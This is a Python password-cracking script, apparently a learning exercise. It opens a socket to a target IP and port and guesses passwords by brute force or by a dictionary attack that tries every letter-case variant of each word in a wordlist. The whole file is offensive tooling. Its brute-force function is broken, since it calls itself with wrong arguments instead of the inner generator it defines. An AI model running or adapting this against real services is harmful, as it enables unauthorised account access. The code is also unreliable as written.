import sys
import socket
from itertools import product

chars = [chr(i) for i in list(range(97, 123)) + list(range(48, 58))]


def bruteforce(sock):
    def pass_gen():
        return (''.join(i) for i in product(chars, repeat=length))

    length = 0

    while True:
        length += 1
        for attempt in bruteforce(chars, length):
            sock.send(attempt.encode())
            response = sock.recv(1024).decode()

            if response == "Connection success!":
                print(attempt)
                return
            elif response == "Too many attempts":
                return


def dict_based(sock):
    passwords = []
    with open('hacking/password.txt', 'r') as f:
        for line in f:
            passwords.append(line.strip())

    for word in passwords:
        cases = map(''.join, product(*zip(word.upper(), word.lower())))
        for i in cases:
            sock.send(i.encode())
            response = sock.recv(1024).decode()

            if response == "Connection success!":
                print(i)
                return
            elif response == "Too many attempts":
                return


def main():
    _, ip, port = sys.argv

    with socket.socket() as s:
        s.connect((ip, int(port)))
        # bruteforce(s)
        dict_based(s)



if __name__ == '__main__':
    main()
